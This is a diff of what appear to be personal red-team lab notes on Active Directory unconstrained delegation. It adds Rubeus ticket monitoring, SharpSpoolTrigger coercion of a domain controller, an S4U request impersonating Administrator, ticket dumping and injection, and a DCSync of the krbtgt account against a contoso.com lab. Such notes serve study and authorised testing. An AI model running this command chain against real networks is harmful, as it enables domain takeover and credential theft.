@@ -14,9 +14,22 @@ jump psexec64 lon-ws-1 smb
 
 1.  Perform coercion to make a high level machine (DC) connect
 
+		Monitor incoming tickets on unconstrained host (High integrity beacon)
 ```powershell
-
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /nowrap
 ```
+
+		From a medium integrity beacon; may need to run a few times
+```powershell
+execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe lon-dc-1 lon-ws-1
+```
+
+		Turn TGT into a usable service ticket impersonating Administrator; /self
+```powershell
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:Administrator /self /altservice:ldap/lon-dc-1.contoso.com /nowrap /ticket:
+```
+
+> Use the FQDN for the services to avoid oopsies
 
 2. Dump tickets from memory
 
@@ -26,12 +39,7 @@ execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x6c5b5 /service:krbtgt /nowrap
 ```
 
-
-Stop Rubeus
-```powershell
-jobs
-jobkill 0
-```
+---
 
 Inject TGT into sacrificial logon session
 ```powershell
@@ -45,5 +53,10 @@ run klist
 
 rev2self       <--- Drop impersonation
 kill [PID]
+```
+
+DCsync??
+```powershell
+dcsync CONTOSO.COM CONTOSO\krbtgt
 ```
 
